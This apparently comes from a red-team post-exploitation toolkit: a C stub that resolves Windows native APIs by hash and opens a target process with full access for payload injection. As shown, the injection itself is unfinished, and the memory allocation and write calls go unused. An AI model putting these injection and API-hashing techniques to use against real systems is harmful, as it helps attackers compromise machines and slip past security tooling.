/*!
 *
 * PostEx
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

typedef struct
{
	D_API( NtQueryInformationProcess );
	D_API( NtUnmapViewOfSection );
	D_API( NtMapViewOfSection );
	D_API( NtOpenProcess );
	D_API( NtClose );
} API ;

typedef struct
{
	D_API( NtAllocateVirtualMemory );
	D_API( NtWaitForSingleObject );
	D_API( NtWriteVirtualMemory );
} SYS ;

/* API Hashes */
#define H_API_NTALLOCATEVIRTUALMEMORY	0xf783b8ec /* NtAllocateVirtualMemory */
#define H_API_NTOPENPROCESS		0x4b82f718 /* NtOpenProcess */
#define H_API_NTCLOSE			0x40d6e69d /* NtClose */

/* LIB Hashes */
#define H_LIB_NTDLL			0x1edab0ed /* ntdll.dll */

/*!
 *
 * Purpose:
 *
 * Injects the target process with the specified 
 * payload.
 *
!*/
D_SEC( A ) DWORD __cdecl Entry( _In_ DWORD Pid, _In_ DWORD Offset, _In_ PVOID Buffer, _In_ DWORD Length )
{
	API			Api;
	SYS			Sys;
	CLIENT_ID		Cid;
	OBJECT_ATTRIBUTES	Att;

	SIZE_T			Len = 0;

	PVOID			Buf = NULL;
	HANDLE			Prc = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Sys, sizeof( Sys ) );
	RtlSecureZeroMemory( &Cid, sizeof( Cid ) );
	RtlSecureZeroMemory( &Att, sizeof( Att ) );

	Api.NtOpenProcess = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTOPENPROCESS );
	Api.NtClose       = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCLOSE );

	Cid.UniqueProcess = C_PTR( Pid );
	InitializeObjectAttributes( &Att, NULL, 0, NULL, NULL );

	/* Open up the target process for writing arbitrary memory to! */
	if ( NT_SUCCESS( Api.NtOpenProcess( &Prc, PROCESS_ALL_ACCESS, &Att, &Cid ) ) ) {
		Api.NtClose( Prc );
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Sys, sizeof( Sys ) );
	RtlSecureZeroMemory( &Cid, sizeof( Cid ) );
	RtlSecureZeroMemory( &Att, sizeof( Att ) );
};
